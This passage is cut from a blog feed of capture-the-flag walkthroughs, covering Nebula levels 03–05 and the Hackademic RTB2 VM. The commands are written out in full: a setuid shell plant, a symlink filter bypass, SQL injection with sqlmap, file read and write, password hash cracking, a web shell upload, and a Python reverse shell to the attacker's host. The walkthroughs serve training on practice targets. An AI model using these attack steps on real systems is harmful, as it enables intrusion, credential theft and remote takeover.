</span><span class='line'><span class="s1">   setreuid(geteuid(),geteuid());</span>
</span><span class='line'><span class="s1">   execve(&quot;/bin/sh&quot;, NULL, NULL);</span>
</span><span class='line'>
</span><span class='line'><span class="s1">   return 0;</span>
</span><span class='line'><span class="s1">}</span>
</span><span class='line'><span class="s1">&#39;</span> &gt; /tmp/run.c
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash</span>
</span><span class='line'><span class="s1">gcc /tmp/run.c -o /home/flag03/x</span>
</span><span class='line'><span class="s1">chmod +s /home/flag03/x</span>
</span><span class='line'><span class="s1">&#39;</span> &gt; run.sh
</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>chmod +x run.sh
</span></code></pre></td></tr></table></div></figure>


<p>After a little waiting, the suid binary is created:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>../x
</span><span class='line'>bash-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>Level04</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s [file to read]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;token&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You may not access &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to read fd %d&quot;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We cannot read the token file, but symlink technique is sufficient:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:~$ cd /home/flag04/
</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 
</span><span class='line'>./flag04 [file to read]
</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 token 
</span><span class='line'>You may not access 'token'
</span><span class='line'>level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/x
</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 /tmp/x 
</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2
</span><span class='line'>level04@nebula:/home/flag04$ su - flag04
</span><span class='line'>Password: 
</span><span class='line'>flag04@nebula:~$ getflag 
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h2>Level05</h2>

<p>In /home/flag05 we can find the backup file with ssh private key.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level05@nebula:/home/flag05$</span> tar xvzf .backup/backup-19072011.tgz  -C /tmp/
</span><span class='line'><span class="go">.ssh/</span>
</span><span class='line'><span class="go">.ssh/id_rsa.pub</span>
</span><span class='line'><span class="go">.ssh/id_rsa</span>
</span><span class='line'><span class="go">.ssh/authorized_keys</span>
</span><span class='line'>
</span><span class='line'><span class="gp">level05@nebula:/home/flag05$</span> ssh -i /tmp/.ssh/id_rsa flag05@0
</span><span class='line'><span class="gp">flag05@nebula:~$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackademic: RTB2]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/03/hackademic-rtb2/"/>
    <updated>2015-06-03T17:26:01+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/03/hackademic-rtb2</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb2,18/">Hackademic: RTB2</a></p>

<p>We gained the IP address 192.168.80.150 for our testing target.</p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:# nmap 192.168.80.150 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:55 CEST
</span><span class='line'>Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
</span><span class='line'>SYN Stealth Scan Timing: About 65.57% done; ETC: 07:55 (0:00:01 remaining)
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up (0.00039s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT    STATE    SERVICE
</span><span class='line'>80/tcp  open     http
</span><span class='line'>666/tcp filtered doom
</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds</span></code></pre></td></tr></table></div></figure>


<p>It seems that the port 666 is filtered by the firewall. After running nmap scan
several times, we found the port to be open.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:# nmap 192.168.80.150 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:55 CEST
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up (0.00036s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT    STATE    SERVICE
</span><span class='line'>80/tcp  open     http
</span><span class='line'>666/tcp filtered doom
</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds
</span><span class='line'>
</span><span class='line'>root@kali32:~# nmap 192.168.80.150 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:56 CEST
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up (0.00038s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>80/tcp  open  http
</span><span class='line'>666/tcp open  doom
</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds</span></code></pre></td></tr></table></div></figure>


<p>Nikto output for port 80:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h http://192.168.80.150/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.80.150
</span><span class='line'>+ Target Hostname:    192.168.80.150
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-04-30 10:15:26 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.2.14 (Ubuntu)
</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ Uncommon header 'tcn' found, with contents: list
</span><span class='line'>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
</span><span class='line'>+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, inode: 413560, size: 5108, mtime: Tue Aug 28 12:48:10 2007
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
</span><span class='line'>+ 7495 requests: 0 error(s) and 15 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-04-30 10:15:41 (GMT2) (15 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>The web page suggests to look for SQLi, unfortunately we were not able to find
any here.</p>

<p>Trying hydra for bruteforce or joomscan (port 666) reveals us nothing new too.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# hydra 192.168.80.150 http-form-post "/check.php:username=^USER^&password=^PASS^&Submit=Check%21:wrong credentials" -L /usr/share/ncrack/default.usr -P /usr/share/ncrack/default.pwd  -t 10 -w 30  -u -f 
</span><span class='line'>root@kali32:/tmp# joomscan -u http://192.168.80.150:666/index.php -oh</span></code></pre></td></tr></table></div></figure>


<p>After a little time, we found SQLi in Joomla and dumped the whole database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --dump-all</span></code></pre></td></tr></table></div></figure>


<p>Trying to crack MySQL hashes was without success.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv 
</span><span class='line'>Host,User,Password,ssl_type,Drop_priv,File_priv,Grant_priv,Super_priv,Alter_priv,ssl_cipher,Index_priv,Event_priv,Create_priv,max_updates,Reload_priv,Delete_priv,Insert_priv,x509_issuer,Select_priv,Update_priv,Execute_priv,Show_db_priv,x509_subject,Process_priv,Trigger_priv,Shutdown_priv,max_questions,Show_view_priv,References_priv,max_connections,Repl_slave_priv,Repl_client_priv,Create_user_priv,Create_view_priv,Lock_tables_priv,Alter_routine_priv,Create_routine_priv,max_user_connections,Create_tmp_table_priv
</span><span class='line'>localhost,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>HackademicRTB2,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>127.0.0.1,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>localhost,debian-sys-maint,*F36E6519B0B1D62AA2D5346EFAD66D1CAF248996,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>localhost,phpmyadmin,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,N,N,N,N,N,&lt;blank>,N,N,N,0,N,N,N,&lt;blank>,N,N,N,N,&lt;blank>,N,N,N,0,N,N,0,N,N,N,N,N,N,N,0,N
</span><span class='line'>
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > hashes.csv
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# john --format=mysql-sha1 hashes.csv</span></code></pre></td></tr></table></div></figure>


<p>We parse the Joomla usernames and passwords and crack using John:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv 
</span><span class='line'>id,gid,name,email,block,params,username,usertype,password,sendEmail,activation,registerDate,lastvisitDate
</span><span class='line'>62,25,Administrator,admin@hackademirtb2.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,Administrator,Super Administrator,08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl,1,&lt;blank>,2011-01-17 19:31:21,2011-01-22 16:38:49
</span><span class='line'>63,18,John Smith,JSmith@hackademicrtb.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,JSmith,Registered,992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF,0,&lt;blank>,2011-01-22 10:17:30,2011-01-25 15:02:13
</span><span class='line'>64,18,Billy Tallor,BTallor@hackademic.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,BTallor,Registered,abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy,0,&lt;blank>,2011-01-22 10:18:06,0000-00-00 00:00:00
</span><span class='line'>
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e 's/:/\$/' -e 's/,/:/'  
</span><span class='line'>username:password
</span><span class='line'>Administrator:08f43b7f40fb0d56f6a8fb0271ec4710$n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
</span><span class='line'>JSmith:992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF
</span><span class='line'>BTallor:abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
</span><span class='line'>
</span><span class='line'>root@kali32:/usr/share/dirb# john --list=subformats
</span><span class='line'>Format = dynamic_0   type = dynamic_0: md5($p) (raw-md5)
</span><span class='line'>Format = dynamic_1   type = dynamic_1: md5($p.$s) (joomla)
</span><span class='line'>Format = dynamic_2   type = dynamic_2: md5(md5($p)) (e107)
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e 's/:/\$/' -e 's/,/:/'  > /tmp/joomla.pass 
</span><span class='line'>
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1
</span><span class='line'>...
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1 --show
</span><span class='line'>JSmith:matrix
</span><span class='line'>BTallor:victim
</span><span class='line'>test:test
</span><span class='line'>
</span><span class='line'>3 password hashes cracked, 1 left</span></code></pre></td></tr></table></div></figure>


<p>Because the SQLi statements are executed by database root user, we can read or store arbitrary file to the server.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/passwd
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/issue</span></code></pre></td></tr></table></div></figure>


<p>The target is Ubuntu 10.04, we can predict better the filenames in /etc:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/phpmyadmin/config.inc.php</span></code></pre></td></tr></table></div></figure>


<p>We generate and upload the weevely shell, then upgrade to python shell over netcat:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-write=weevely.php --file-dest=/var/www/test1.php
</span><span class='line'>
</span><span class='line'>root@kali32:/usr/share/exploitdb# nc -lp 1338
</span><span class='line'>
</span><span class='line'>www-data@HackademicRTB2:/tmp $ python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" 192.168.80.137 1338
</span><span class='line'>www-data@HackademicRTB2:/tmp$</span></code></pre></td></tr></table></div></figure>


<p>The following credentials could be used to log in phpMyAdmin using root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">HackademicRTB2</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">configuration</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">JConfig</span> <span class="p">{</span>
</span><span class='line'><span class="cm">/* Site Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offline</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offline_message</span> <span class="o">=</span> <span class="s1">&#39;This site is down for maintenance.&lt;br /&gt; Please check back again soon.&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sitename</span> <span class="o">=</span> <span class="s1">&#39;Hackademic.RTB2&#39;</span><span class="p">;</span>
